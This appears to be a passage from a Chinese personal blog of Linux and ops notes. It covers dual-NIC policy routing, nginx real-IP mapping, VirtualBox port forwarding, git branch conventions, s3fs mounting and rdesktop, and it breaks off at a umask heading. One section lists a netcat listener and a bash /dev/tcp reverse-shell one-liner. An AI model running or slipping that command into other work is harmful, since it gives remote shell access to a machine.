&lt;pre&gt;&lt;code&gt;# 网卡初始化

DEVICE=eth1
NM_CONTROLLED=yes
ONBOOT=yes
IPADDR=&amp;lt;网卡2IP&amp;gt;
NETMASK=255.255.240.0

# 
echo &amp;#34;10 t1&amp;#34; &amp;gt;&amp;gt; /etc/iproute2/rt_tables
echo &amp;#34;20 t2&amp;#34; &amp;gt;&amp;gt; /etc/iproute2/rt_tables

/usr/sbin/ip route add default dev eth0 via 172.21.0.1 table 10
/usr/sbin/ip route add default dev eth1 via 172.21.0.1 table 20

/usr/sbin/ip rule add from 172.21.2.168 table 10
/usr/sbin/ip rule add from 172.21.2.74 table 20&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="shell-反弹"&gt;&lt;span&gt;shell 反弹&lt;/span&gt;
 &lt;a href="#shell-%e5%8f%8d%e5%bc%b9" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;a href="https://blog.csdn.net/weixin_41082546/article/details/104123131" target="_blank" rel="external nofollow noopener noreferrer"&gt;https://blog.csdn.net/weixin_41082546/article/details/104123131&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;# 被控端执行 
nc -lvp 65535
# 控制端执行 
bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;被控端ip&amp;gt;/65535 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="nginx-获取cdn真实用户ip"&gt;&lt;span&gt;nginx 获取cdn真实用户ip&lt;/span&gt;
 &lt;a href="#nginx-%e8%8e%b7%e5%8f%96cdn%e7%9c%9f%e5%ae%9e%e7%94%a8%e6%88%b7ip" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;# client_real_ip 即为用户真实IP,可直接用于替换 remote_addr 
 map $http_x_forwarded_for $client_real_ip {
 &amp;#34;&amp;#34; $remote_addr;
 # fix: 兼容ipv6
 ~^(?P&amp;lt;firstAddr&amp;gt;[0-9a-fA-F:.]&amp;#43;),?.*$ $firstAddr;
 }&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="virtualbox---从主机端口80到virtualbox端口80的端口转发不起作用"&gt;&lt;span&gt;virtualbox - 从主机端口80到VirtualBox端口80的端口转发不起作用&lt;/span&gt;
 &lt;a href="#virtualbox---%e4%bb%8e%e4%b8%bb%e6%9c%ba%e7%ab%af%e5%8f%a380%e5%88%b0virtualbox%e7%ab%af%e5%8f%a380%e7%9a%84%e7%ab%af%e5%8f%a3%e8%bd%ac%e5%8f%91%e4%b8%8d%e8%b5%b7%e4%bd%9c%e7%94%a8" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;此次问题实际出现是在&lt;code&gt;windows&lt;/code&gt;上, 理论上说&lt;code&gt;linux&lt;/code&gt;下若使用&lt;code&gt;nat&lt;/code&gt;功能可能也会出现该问题(至于为什么用&lt;code&gt;nat&lt;/code&gt;,&lt;code&gt;virtualbox&lt;/code&gt;似乎并不支持桥接网卡,因此要为虚拟机分配物理&lt;code&gt;ip&lt;/code&gt;似乎就只能在物理机绑定多个&lt;code&gt;ip&lt;/code&gt;,然后&lt;code&gt;nat&lt;/code&gt;转发到虚拟机中), &lt;code&gt;virtualbox&lt;/code&gt;在转发&lt;code&gt;80&lt;/code&gt;端口时似乎会与物理机的&lt;code&gt;80&lt;/code&gt;冲突,从而导致转发无效,这个可能是因为我物理机也启用了&lt;code&gt;IIS&lt;/code&gt;的原因.好吧,以上都是些废话,我也不知道在说些什么,下面看解决方案.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;解决方案&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;我是用的 &lt;code&gt;windows&lt;/code&gt;的端口转发解决的, &lt;code&gt;virtualbox&lt;/code&gt;在&lt;code&gt;nat&lt;/code&gt;的时候转发一个其他端口(比如&lt;code&gt;8080&lt;/code&gt;)到内部的&lt;code&gt;80&lt;/code&gt;, 然后在&lt;code&gt;windows&lt;/code&gt; 在进行一次转发,将绑定的&lt;code&gt;ip&lt;/code&gt;的&lt;code&gt;80&lt;/code&gt;端口转发到&lt;code&gt;8080&lt;/code&gt;上,这样也可以解决,骚操作看 &lt;a href="https://blog.0x5c0f.cc/2022/%e5%91%bd%e4%bb%a4%e6%94%b6%e9%9b%86/#3-windows-%e7%ab%af%e5%8f%a3%e8%bd%ac%e5%8f%91"&gt;&lt;code&gt;windows命令收集&lt;/code&gt;-&lt;code&gt;端口转发&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;还有个说的是用管理员身份运行&lt;code&gt;virtualbox&lt;/code&gt;,也可以解决,不过我没有验证过&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href="https://www.coder.work/article/6503907" target="_blank" rel="external nofollow noopener noreferrer"&gt;https://www.coder.work/article/6503907&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 class="heading-element" id="服务器默认端口优化"&gt;&lt;span&gt;服务器默认端口优化&lt;/span&gt;
 &lt;a href="#%e6%9c%8d%e5%8a%a1%e5%99%a8%e9%bb%98%e8%ae%a4%e7%ab%af%e5%8f%a3%e4%bc%98%e5%8c%96" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;检查所有非22开启的端口：&lt;code&gt;netstat -lntp&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$&amp;gt; netstat -lntp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name 
tcp 0 0 127.0.0.1:25 0.0.0.0:* LISTEN 1317/master 
tcp 0 0 0.0.0.0:111 0.0.0.0:* LISTEN 1/systemd 
tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1569/sshd 
tcp6 0 0 ::1:25 :::* LISTEN 1317/master 
tcp6 0 0 :::111 :::* LISTEN 1/systemd 
tcp6 0 0 :::22 :::* LISTEN 1569/sshd &lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;查询&lt;code&gt;/etc/services&lt;/code&gt;下端口对应的服务：&lt;code&gt;grep -E &amp;quot;25|111/&amp;quot; /etc/services &lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$&amp;gt; grep -E &amp;#34;\ 25/|\ 111/&amp;#34; /etc/services 
smtp 25/tcp mail
smtp 25/udp mail
sunrpc 111/tcp portmapper rpcbind # RPC 4.0 portmapper TCP
sunrpc 111/udp portmapper rpcbind # RPC 4.0 portmapper UD&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;检查服务的运行状态(第三列为服务名称)： &lt;code&gt;systemctl list-unit-files |grep -E &amp;quot;rpcbind|portmapper|mail&amp;quot;&lt;/code&gt;, 若单个端口所映射的服务没有查询到，需要通过运行端口的&lt;code&gt;pid&lt;/code&gt;去查询他具体是属于那个程序的，然后然后去查询具体的服务启动状态。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$&amp;gt; systemctl list-unit-files |grep -E &amp;#34;rpcbind|portmapper|postfix&amp;#34;
postfix.service enabled 
rpcbind.service enabled 
rpcbind.socket enabled 
rpcbind.target static 
$&amp;gt; systemctl stop postfix.service rpcbind.service rpcbind.socket # 关闭启动的服务
$&amp;gt; systemctl disable postfix.service rpcbind.service rpcbind.socket # 禁用开机启动&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 class="heading-element" id="linux-下hosts文件和dns服务器的响应顺序"&gt;&lt;span&gt;linux 下hosts文件和dns服务器的响应顺序&lt;/span&gt;
 &lt;a href="#linux-%e4%b8%8bhosts%e6%96%87%e4%bb%b6%e5%92%8cdns%e6%9c%8d%e5%8a%a1%e5%99%a8%e7%9a%84%e5%93%8d%e5%ba%94%e9%a1%ba%e5%ba%8f" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;通过修改 &lt;code&gt;/etc/nsswitch.conf&lt;/code&gt; 进行更换 , 更换&lt;code&gt;/etc/nsswitch.conf: 86&lt;/code&gt;中的&lt;code&gt;files&lt;/code&gt;和&lt;code&gt;dns&lt;/code&gt;的顺序即可&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 class="heading-element" id="git-常见代码规范"&gt;&lt;span&gt;GIT 常见代码规范&lt;/span&gt;
 &lt;a href="#git-%e5%b8%b8%e8%a7%81%e4%bb%a3%e7%a0%81%e8%a7%84%e8%8c%83" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;分支命名&lt;/p&gt;
&lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
 &lt;th style="text-align: left"&gt;分支&lt;/th&gt;
 &lt;th&gt;说明&lt;/th&gt;
 &lt;/tr&gt;
 &lt;/thead&gt;
 &lt;tbody&gt;
 &lt;tr&gt;
 &lt;td style="text-align: left"&gt;&lt;code&gt;master&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;主分支，也是用于部署生产环境的分支。需要确保&lt;code&gt;master&lt;/code&gt;分支稳定性。&lt;code&gt;master&lt;/code&gt;分支一般由&lt;code&gt;release&lt;/code&gt;以及&lt;code&gt;hotfix&lt;/code&gt;分支合并，任何时间都不能直接修改代码。&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td style="text-align: left"&gt;&lt;code&gt;develop&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;开发分支，始终保持最新完成以及&lt;code&gt;bug&lt;/code&gt;修复后的代码，用于前后端联调，一般开发的新功能时，&lt;code&gt;feature&lt;/code&gt;分支都是基于&lt;code&gt;develop&lt;/code&gt;分支创建的。&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td style="text-align: left"&gt;&lt;code&gt;feature&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;开发新功能时，以&lt;code&gt;develop&lt;/code&gt;为基础创建&lt;code&gt;feature&lt;/code&gt;分支。分支命名时可以加上开发的功能模块，命名示例：&lt;code&gt;feature/user_module&lt;/code&gt;、&lt;code&gt;feature/cart_module&lt;/code&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td style="text-align: left"&gt;&lt;code&gt;test&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;测试分支，专门给测试人员使用，版本相对稳定。&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td style="text-align: left"&gt;&lt;code&gt;release&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;预发布分支，&lt;code&gt;UAT&lt;/code&gt;测试阶段使用，一般由&lt;code&gt;test&lt;/code&gt;或&lt;code&gt;hotfix&lt;/code&gt;分支合并，不建议直接在&lt;code&gt;release&lt;/code&gt;分支上直接修改代码。&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td style="text-align: left"&gt;&lt;code&gt;hotfix&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;线上出现问题紧急线上出现紧急问题时，需要及时修复，以&lt;code&gt;master&lt;/code&gt;分支为基线，创建&lt;code&gt;hotfix&lt;/code&gt;分支，修复完成后，需要合并到&lt;code&gt;master&lt;/code&gt;分支和&lt;code&gt;develop&lt;/code&gt;分支。&lt;/td&gt;
 &lt;/tr&gt;
 &lt;/tbody&gt;
&lt;/table&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;分支与环境对应关系&lt;/p&gt;
&lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
 &lt;th&gt;分支&lt;/th&gt;
 &lt;th&gt;功能&lt;/th&gt;
 &lt;th&gt;环境&lt;/th&gt;
 &lt;th style="text-align: center"&gt;可访问&lt;/th&gt;
 &lt;/tr&gt;
 &lt;/thead&gt;
 &lt;tbody&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;code&gt;master&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;主分支，稳定版本&lt;/td&gt;
 &lt;td&gt;PRO&lt;/td&gt;
 &lt;td style="text-align: center"&gt;是&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;code&gt;develop&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;开发分支，最新版本&lt;/td&gt;
 &lt;td&gt;DEV&lt;/td&gt;
 &lt;td style="text-align: center"&gt;是&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;code&gt;feature&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;开发分支，实现新特性&lt;/td&gt;
 &lt;td&gt;-&lt;/td&gt;
 &lt;td style="text-align: center"&gt;否&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;code&gt;test&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;测试分支，功能测试&lt;/td&gt;
 &lt;td&gt;FAT&lt;/td&gt;
 &lt;td style="text-align: center"&gt;是&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;code&gt;release&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;预上线分支，发布新版本&lt;/td&gt;
 &lt;td&gt;UAT&lt;/td&gt;
 &lt;td style="text-align: center"&gt;是&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;code&gt;hotfix&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;紧急修复分支，修复线上bug&lt;/td&gt;
 &lt;td&gt;-&lt;/td&gt;
 &lt;td style="text-align: center"&gt;否&lt;/td&gt;
 &lt;/tr&gt;
 &lt;/tbody&gt;
&lt;/table&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;单次提交注意事项&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;提交问题必须为同一类别的。&lt;/li&gt;
&lt;li&gt;提交问题不要超过&lt;code&gt;3&lt;/code&gt;个。&lt;/li&gt;
&lt;li&gt;提交的&lt;code&gt;commit&lt;/code&gt;发现不符合规范，&lt;code&gt;git commit --amend -m &amp;quot;新的提交信息&amp;quot;&lt;/code&gt; 或 &lt;code&gt;git reset --hard HEAD&lt;/code&gt; 重新提交一次。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;提交类型&lt;/p&gt;
&lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
 &lt;th&gt;类型&lt;/th&gt;
 &lt;th&gt;说明&lt;/th&gt;
 &lt;/tr&gt;
 &lt;/thead&gt;
 &lt;tbody&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;code&gt;feat&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;新增 &lt;code&gt;feature&lt;/code&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;code&gt;fix&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;修复 &lt;code&gt;bug&lt;/code&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;code&gt;docs&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;仅仅修改了文档，比如&lt;code&gt;README&lt;/code&gt;, &lt;code&gt;CHANGELOG&lt;/code&gt;, &lt;code&gt;CONTRIBUTE&lt;/code&gt;等等&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;code&gt;style&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;仅仅修改了空格、格式缩进、都好等等，不改变代码逻辑&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;code&gt;refactor&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;代码重构，没有加新功能或者修复&lt;code&gt;bug&lt;/code&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;code&gt;perf&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;优化相关，比如提升性能、体验&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;code&gt;test&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;测试用例，包括单元测试、集成测试等&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;code&gt;chore&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;改变构建流程、或者增加依赖库、工具等&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;code&gt;revert&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;回滚到上一个版本&lt;/td&gt;
 &lt;/tr&gt;
 &lt;/tbody&gt;
&lt;/table&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 class="heading-element" id="linux-通过s3fs挂载七牛云存储"&gt;&lt;span&gt;linux 通过s3fs挂载七牛云存储&lt;/span&gt;
 &lt;a href="#linux-%e9%80%9a%e8%bf%87s3fs%e6%8c%82%e8%bd%bd%e4%b8%83%e7%89%9b%e4%ba%91%e5%ad%98%e5%82%a8" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;$&amp;gt; sudo yum install epel-release
$&amp;gt; sudo yum install s3fs-fuse

$&amp;gt; echo AK:SK &amp;gt; /mnt/.passwd-s3fs
$&amp;gt; chmod 600 /mnt/.passwd-s3fs

$&amp;gt; s3fs s3空间名 /mnt/s3fs -o passwd_file=/mnt/.passwd-s3fs -o url=http://s3-cn-north-1.qiniucs.com -o use_path_request_style # -o dbglevel=info -f -o curldbg # 日志信息&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="普通用户校验是否有权限通过dockersock操作-docker"&gt;&lt;span&gt;普通用户校验是否有权限通过docker.sock操作 docker&lt;/span&gt;
 &lt;a href="#%e6%99%ae%e9%80%9a%e7%94%a8%e6%88%b7%e6%a0%a1%e9%aa%8c%e6%98%af%e5%90%a6%e6%9c%89%e6%9d%83%e9%99%90%e9%80%9a%e8%bf%87dockersock%e6%93%8d%e4%bd%9c-docker" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;sudo -u zabbix curl --unix-socket /var/run/docker.sock --no-buffer -XGET v1.24/_ping&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="rdesktop-远程桌面工具安装"&gt;&lt;span&gt;rdesktop 远程桌面工具安装&lt;/span&gt;
 &lt;a href="#rdesktop-%e8%bf%9c%e7%a8%8b%e6%a1%8c%e9%9d%a2%e5%b7%a5%e5%85%b7%e5%ae%89%e8%a3%85" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;rdesktop 用于linux下的rdp工具，还是非常好用的&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;$&amp;gt; sudo dnf install rdesktop
$&amp;gt; rdesktop -a 16 -g 1900x960 -r clipboard:PRIMARYCLIPBOARD -r disk:floppy=/tmp/ -u administrator &amp;lt;server_ip&amp;gt;:&amp;lt;port&amp;gt; -p&amp;lt;password&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="umask-计算方法"&gt;&lt;span&gt;Umask 计算方法&lt;/span&gt;
 &lt;a href="#umask-%e8%ae%a1%e7%ae%97%e6%96%b9%e6%b3%95" class="heading-mark"&gt;
